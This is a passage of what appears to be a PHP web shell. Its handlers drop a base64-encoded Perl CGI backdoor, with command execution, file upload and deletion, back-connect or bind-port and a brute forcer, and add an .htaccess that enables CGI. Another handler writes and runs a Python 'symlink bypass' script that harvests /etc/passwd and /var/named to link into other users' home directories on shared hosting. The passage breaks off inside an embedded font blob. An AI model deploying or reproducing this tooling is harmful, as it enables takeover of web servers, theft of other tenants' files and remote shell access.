EaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luDQp7DQoJJlBlcmZvcm1Mb2dpbjsNCn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCEoJGNobW9kIGVxIDApKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJY2hvcCgkcmVzdWx0PSBgY2htb2QgJGNobW9kICIkZmlsZSJgKTsNCgkJCWlmKCZ0cmltKCRyZXN1bHQpIGVxICIiKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0NCgkJfQ0KCX0NCgkkcmVuYW1lPSRpbnsncmVuYW1lJ307DQoJaWYoISRyZW5hbWUgZXEgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoNCglwcmludCAmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0DQp7DQoJJlByaW50UGFnZUhlYWRlcigiY2xpZW50cG9ydCIpOw0KCXByaW50ICZCYWNrQmluZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.SHENZYY' target='_blank'>Klik Here</a>";
}elseif($_GET['do'] == 'symlink_python') {
	$sym_dir = mkdir('ia_sympy', 0755);
        chdir('ia_sympy');
	$file_sym = "sym.py";
	$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
        $sym = fopen($file_sym, "w");
	fwrite($sym, base64_decode($sym_script));
	chmod($file_sym, 0755);
        $jancok = exe("python sym.py");
	echo "<br><center>Done ... <a href='ia_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
} 

elseif($_GET['do'] == 'cgi2') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi2.SHENZYY";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .SHENZYY \n AddHandler cgi-script .SHENZYY \n AddHandler cgi-script .con7ext";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgQ29uN2V4dA0KIyBUaGFua3MgVG8gOiAweDE5OTkgLSBYYWkgU3luZGljYXRlIFRlYW0gLSBBbmQgWW91DQogDQokV2luTlQgPSAwOw0KJE5UQ21kU2VwID0gIiYiOw0KJFVuaXhDbWRTZXAgPSAiOyI7DQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOw0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0Kc3ViIFJlYWRQYXJzZQ0Kew0KICAgIGxvY2FsICgqaW4pID0gQF8gaWYgQF87DQogICAgbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCiAgIA0KICAgICRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KIA0KICAgIGlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQogICAgew0KICAgICAgICAkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCiAgICB9DQogICAgZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQogICAgew0KICAgICAgICBiaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQogICAgICAgIHJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQogICAgfQ0KIA0KICAgICMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCiAgICBpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCiAgICB7DQogICAgICAgICRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcNCiAgICAgICAgQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsNCiAgICAgICAgJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiAgICAgICAgJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KICAgICAgICAkSGVhZGVyID0gJGA7DQogICAgICAgICRCb2R5ID0gJCc7DQogICAgICAgICRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCiAgICAgICAgJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQogICAgICAgICRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsNCiAgICAgICAgJGlueydmJ30gPSAkMTsNCiAgICAgICAgJGlueydmJ30gPX4gcy9cIi8vZzsNCiAgICAgICAgJGlueydmJ30gPX4gcy9ccy8vZzsNCiANCiAgICAgICAgIyBwYXJzZSB0cmFpbGVyDQogICAgICAgIGZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgICRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KICAgICAgICAgICAgJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KICAgICAgICAgICAgJGtleSA9ICQxOw0KICAgICAgICAgICAgJHZhbCA9ICQnOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KICAgIHsNCiAgICAgICAgQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KICAgICAgICBmb3JlYWNoICRpICgwIC4uICQjaW4pDQogICAgICAgIHsNCiAgICAgICAgICAgICRpblskaV0gPX4gcy9cKy8gL2c7DQogICAgICAgICAgICAoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KICAgICAgICAgICAgJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KfQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+Q29uN2V4dDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCjxzdHlsZT4NCkBmb250LWZhY2Ugew0KICAgIGZvbnQtZmFtaWx5OiAndWJ1bnR1X21vbm9yZWd1bGFyJzsNCnNyYzogdXJsKGRhdGE6YXBwbGljYXRpb24veC1mb250LXdvZmY7Y2hhcnNldD11dGYtODtiYXNlNjQsZDA5R1JnQUJBQUFBQUdXSUFCTUFBQUFBdkRBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJHUmxSTkFBQUJxQUFBQUJ3QUFBQWNaTytIZEVkRVJVWUFBQUhFQUFBQUtRQUFBQ3dDSXdFSlIxQlBVd0FBQWZBQUFBQXlBQUFBUURYT1RyQkhVMVZDQUFBQ0pBQUFBVmtBQUFJR2xOdkpxRTlUTHpJQUFBT0FBQUFBWFFBQUFHQ1pWUVRaWTIxaGNBQUFBK0FBQUFHT0FBQUI2Z0NMakJaamRuUWdBQUFGY0FBQUFFb0FBQUJLRTBrT2MyWndaMjBBQUFXOEFBQUJzUUFBQW1WVHRDK25aMkZ6Y0FBQUIzQUFBQUFJQUFBQUNBQUFBQkJuYkhsbUFBQUhlQUFBVm1FQUFLVzBJcnQyUEdobFlXUUFBRjNjQUFBQU1BQUFBRFlBeTJMRGFHaGxZUUFBWGd3QUFBQWNBQUFBSkFxbUJQOW9iWFI0QUFCZUtBQUFBV2dBQUFPaWhtRnhDR3h2WTJFQUFGK1FBQUFCeUFBQUFkUU9VVGFRYldGNGNBQUFZVmdBQUFBZ0FBQUFJQUlHQWhWdVlXMWxBQUJoZUFBQUFYc0FBQVBPWWxlS3JYQnZjM1FBQUdMMEFBQUI0Z0FBQXRRc0JxVU1jSEpsY0FBQVpOZ0FBQUNuQUFBQkJxUVR2RzUzWldKbUFBQmxnQUFBQUFZQUFBQUdkVnRTcGdBQUFBRUFBQUFBekQyaXp3QUFBQURKNWI3TEFBQUFBTTdNSmRsNDJtTmdaR0JnNEFOaUZRWVFZR0pnQnVJNkJrYUdlb1pHSUt1SjRRV1F6UUtXWVFBQU5tSURMUUFBQUhqYVkyQmtZR0RnWXJCaHNHTmdUcTRzeW1FUVNTOUt6V2FReTBrc3lXUFFZR0FCeWpMOC93OGtzTEdBQUFCM2t3djdBQUI0Mm5XUngwcERRUmlGditzMUxrSndGUXZpSW9nbDloaGpMOFFTQkdNTVhGMjVFR0tNTGt3aTNCaEJpU3Q3N3cwN1BvVzRzN3lJTDZKL2hvdmdRb1k1ZjVselpzN01vQUYySHZsQ2p5NlpjWnl6Wm15TzluaGtJY2t3aGVqOVE0YUx3bEJ3VUhETTZCZUU3Mjl5UmFlUkl6R2IvZTJVWWV1YkNMandEaGpqZ3FId2lBdS9FUTRKamh0QjZTaSt6ZUxyV2VVZmZiYlNwY3JtdHNpTUdjVVZqYVJpdUpQcGhFbkR2RG1keEpkS2VieDBLbGFPWW12V0RpalVmbGRzT0hCU1NqbDFxcXZodG1LckZmM2txVGhxMVZPaWM0Z3lRNXBGcVhVSzVOWkYwclhMVExDaWZBWVkrNGVuUzE0c005L3lvcXYxak9WcFdWeFhVRW1WK0tpbWhscnhWVThEalhob2tyZHB4a2VMZUd1am5RN2hkdEZORDcyc3NzWTZHMnl5eFRZNzdMTEhQZ2NjY3NReEo1eHl4amtYWEhMRk5UZmNjc2M5RC9LM1QzenlybDR6d0tSNGVPYUZFbDU1ay9NK1pIVDhBR25WU3FFQUFBQjQybU5nWm43Qk9JR0JsWUdGZFJhck1RTURvenlFWnI3SWtNYkV3TURBeE0zS3ljekd4TXpFOG9DQjZYOEFnMEkwQXhTNE9QbzZNamd3OFA1bVlrdjdsOGJBd0xhRXFVK0JnV0YrR0NOUTl6YVdMMEFsQ2d4TUFMMzZENzRBQUFCNDJtTmdZR0JtZ0dBWkJrWUdFSGdDNURHQytTd01KNEMwSG9NQ2tNVUhaUEV5eURMVU1meG5ER2FzWURyR2RFZUJTMEZFUVVwQlRrRkpRVTFCWDhGS0lWNWhqYUtTNnAvZlRQLy9nMDBDcVZkZ1dNQVlCRlhQb0NDZ0lLRWdBMVZ2Q1ZmUENGVFAvUC9yLzJmL24vdy8vTC93dis4L2hyK3ZINXg0Y1BqQmdRZjdIK3g1c1BQQnhnY3JIclE4c0xoLytOWXIxbWRRZDVJQUdOa2dYZ1N6bVlBRUU1b0NvQ1FMS3hzN0J5Y1hOdzh2SDcrQW9KQ3dpS2lZdUlTa2xMU01ySnk4Z3FLU3NvcXFtcnFHcHBhMmpxNmV2b0doa2JHSnFabTVoYVdWdFkydG5iMkRvNU96aTZ1YnU0ZW5sN2VQcjU5L1FHQlFjRWhvV0hoRVpGUjBUR3hjZkVKaUVrTjdSMWZQbEpuemx5eGV1bnpaaWxWclZxOWR0Mkg5eGsxYnRtM2R2blBIM2ozNzlqTVVwNlpsM2F0Y1ZKanp0RHlib1hNMlF3a0RRMFlGMkhXNXRRd3JkemVsNUlQWWVYWDNrNXZiWmh3K2N1MzY3VHMzYnU1aU9IU1U0Y25EUjg5Zk1GVGR1c3ZRMnR2UzF6MWg0cVQrYWRNWnBzNmRONGZoMlBFaW9LWnFJQVlBSm9hTXhBQUFBQUFEdGdUMEFKQUFod0NKQUlzQWxnRElBUklBcUFFR0FKa0Fvd0NvQUt3QXNBQzJBSlVBb1FDY0FLNEFkUUN5QUhrQWZBQ1RBS29BalFDZkFLWUFkd0J0QUhBQWZ3QkVCUkVBQUhqYVhWRzdUbHRCRU4wTkR3T0J4TmdnT2RvVXM1bVF4bnVoQlFuRTFZMWlaRHVGNVFocE4zS1JpM0VCSDBDQlJBM2FyeG1nb2FSSW13WWhGMGg4UWo0aEVqTnJpS0kwT3p1emM4NlpNMHZLa2FwMzZXdlBVK2Nra01MZEJzMDIvVTVJdGJNQTk2VHI2NDJNdElNSFdteG05TXAxKy80TEJwdlJsRHRxQU9VOWJ5a1BHVTA3Z1ZxMHAvN1IvQXFHKy93Zjh6c1l0RFRUOU5RNkNla2hCT2FiY1V1RDd4bk51c3NQK29MVjRXSXdNS1NZcHVJdVA2WlMvcmMwNTJyTHNMV1IwYnlETXhINXlUUkFVMnR0QkpyKzFDSFY4M0VVUzVETHByRTJtSml5L2lRVHdZWEpkRlZUdGN6NDJzRmRzclBvWUlNcXpZRUgyTU5XZVF3ZURnOG1GTkszSk1vc0RSSDJZcXZFQ0JHVEhBbzU1ZHpKL3FSQStVZ1N4cnhKU2p2amhyVUd4cEhYd0tBMlQ3UC9QSnROYlc4ZHd2aFpITUYzdnhsTE92aklodG9ZRVdJN1lpbUFDVVJDUmxYNWhoclB2U3dHNUZMN3owQ1VnT1h4ajMrZENMVHUyRVE4bDdWMURqRldDSHArMjl6eXk0cTdWcm5PaTBKM2I2cHFxTklwemZ0ZXpyN0hBNTRlQzhOQlk4R2J6L3YrU29INlBDeXVOR2dPQkVONk4zci9vclhxaUt1OEZ6NnlKOU8vc1ZvQUFBQUFBUUFCLy84QUQzamE3TDBOZkJ2bGxUYzZ6NHkrTE90alJwK1daRm1XRlZsUkZIa2lLWXFpT0k0ZHh4akhHTmQxWGE5cmpBa2g1QXZTWUl4Smc1djE5V2JUTkEzQkNRR2FwaWxOYVpiTjV1Yk56c2dpVUpmU1VMYVhzaXpMOW5JYmZsemVicmZiYlZsM2FaZFN5dktSaVBlY1owYitpTzJRN2JidmUrL3Y5NVphSHpQS3pIbk9jNTV6L3Vmak9jT3dUQlBEc0p1MG4yWTRScy9VeUlRUlYrZjBtdEN2a3JKTys5OVg1emdXUGpJeWg0ZTFlRGluMXkyNnREcEg4SGhLQ0FyaG9CQnNZaXNMaThpeHdsYnRwei80UDVzMEx6RndTVEw0MFJ2c1BzMDdUQ25qWVZxWVhBbkR4R1N1WkRKblpwa1lrYnlpeEZ5VWRhV1QrRGR1MVRHR21Hd1NKaVdUS0Z1RlNkbEhZckxWSk5qa0VpNmJaV1F6Sjlna1IzWlpJcng4UlNycGNqcDBvYXBxdTVBU0hCWldINnJoeUdCbkp0dlJrYzEwaXVjMVJyUHVIcDNacUJtc2IydXJyNyt4amR0R2VncW4yMFlHNzFwVE56QTRnclFadUFIMlBlMU9wb1N4TXpXTXBCY2xQcFVuSll4QkU1TktrMFJ5VU9vNDA2VEU4YklSYURHYkptVW5pVEhMRWlTZGd0dkRUVWw0NmhNeFBPcmt1eTFPMHZtbzA5TE5PN1dPbTI3dWZXUERoamY2MUhlNEo1TmhHTzRGNEllUENaQ2JtWndYK0pGenVqeXBWQ3FuQjVia0RLVW0rSnhuaUZkdmpvMnpRcmwva1RzbE05ckpjWWU3ekxmSW5jeHJOZlFVeDFjRThKUldNem11S3pHYTRSU1JLa1hKZTFIMkFNVWVYbllCeFU3VEpGemVHQnR2Y05wTFlwSWxPVzV3dW9ESmV2aUpYcFFOY0ZwdndOTjZCazVya3BLVGwwdmgzNWxncEVFU2sxWjRKOWI4Nnp1MWpETm1uRmp6M2p0SDhJUGs1Y2Racjk0T05OQlhIYjdDRGNkTFBBYjQ0T0xIamE1UytPRGt4ODFPRS95QXA2OENmWFhnSy83R1RYOEQvNnFNL2l1NHBxOTRuZkxpZGZ6NG0vR0s0aThEZUp4cjRGa09COHdMeUpGeWYwV2c1b3IvU1ExZW1DSjdPbVVQd1YrS28zL09FUDBMMmZFdkE2Y3lqOWE5L2w3RFYrcC9WbmU4YnUrajlUK21uK0h2aVovVy81UzBIeUROKzBsSFFjSy8vWVdKQTRVY2FjYy9PQTV5VFppZEgyVzVvOXFEVEpvNXprZ3BVVnFXa2pYY1pDNmxRV2Fta3NETVNsRjJhV0Vpa2psWEpSNTB1VXRBNGxlSWt2MmlIT0lucFJBdko0SERycVNjZ01rb1Mwb0pYaTRCMXNkQjhEUHdIcktEdEpPc2xCUmtxeVdibFJLMm5LWnljUlkrbFFoU05DdkZiWEs1SDVlRkpnVS9aTEpTcFRCTzdQNzRJbmRXY3Rta2NsZ245YVNDcEpKcjJQVHlHalpTdzZXWHI4aUF0RllRdDc2R2hLcDBUa2NGNjY3Z1VIeWRvWFFOMlJuUGZIbXdkZE9xc2tUWDlsV1pIVjNwRTBlUGRSNklobUo3TiswY0NqWDJaSnIzYnF6OSt1UEhScisrL1FHZjZJN1ZobEl0bVpqRGtXeloxTHIzbE91Vmx6UVZ3aGdmNm15UFplTmhoNisyYzdCajkybkhtNy9RSklCbGpKWUpmL1J6N25XdEJYU0JGZVEvd3FTWU0wek9oQ3NnREMvNW1JWlpwSWxSelFBS0J3NTQ2SUY4SWhEbXpQQ21mTE9YMEc5MitvMUl5M0dONW5rYnc4T2k1YW5RNTNYS054MHZsOE8zeGNxM3hieGNBOStxNkRjNURReDI4WUl0VjJJRjFaS1ZheGJEWjNNNGtFV0dKbERsbEZmQllRL01nYXhqc3NCTCsweWRRMUtFYzdoU3lSWHA1ZFhBU0RMalhHYkc4ZkN1clZ0MzNidHQ2eTRMWnpoODZiMWdTaFFUQ1ZGTWtUMzN3RUU0T2JRSHYrSmg3b2NudnZHTkV5ZE9uYnIwb3VhZEQwM2NEL3QyN2VxRHYwdnZudmpHWTE4OThkaGpKOVFEb0tIclAzcUxlMEhMTXpGbUJkUEliR1Z5VmNBK0taTEtsUUxYNUFiTkpKSFdVZFcxMUFpNllTa3ExWXg1VWxyS3kzVXdiQjZXZGhPOFo1YUMySEJacVU3SWwwWlN5KzBvTjd4dDNPVmVsSUNQak54UUpkak9NenAra2JoOEZSeWdITWpVa1BUeU5Xd3FXY0dpMUxoQmxOYVFqTnRDOVBBcFZCMnhnRmpWc0JsSEJjR2Z3bGU3d3dXL1VMaFJmL3VkNmJXcDdydFdwemUzaS9kOW9UblVGdUU5dWtNbU1TUjJoM0toV09OalBlMzNkUzg3MDducjRLcW1JNDIxcXp2Q3F6ZDJkcVRTTjVQMGh1OTN0Unh0NzloMVE2U3lhV05ELy9OZE4wYTd4T3orVHR1dWI5L1FlTEM5WlczbjlhbmVYWjBkMjd5MW5YMlB0cWZ2Wi90cU43ZlgzVi9idXI0TDF5dDVuR3RqZTBEWG01a2dJNVdJcXBvbmtrWFI4ZndrL2JOT0szZlZwRHllMHhuTmhxMEdzMUdIK2p4K3o1N2Rvcmg3ejcyb0E5NG9uT0hjMmhNTUQvYURTQUs5a3NFOEtkdm9WZXpMYlJsM1NNZlNWYWF2WnQvNDVXUXYrOHdMNHEwUGI3bjV6VGZZY0lHOGZHYjRhT0ZQZnpiNDB0TlN6L0E1OHRMTWE5cm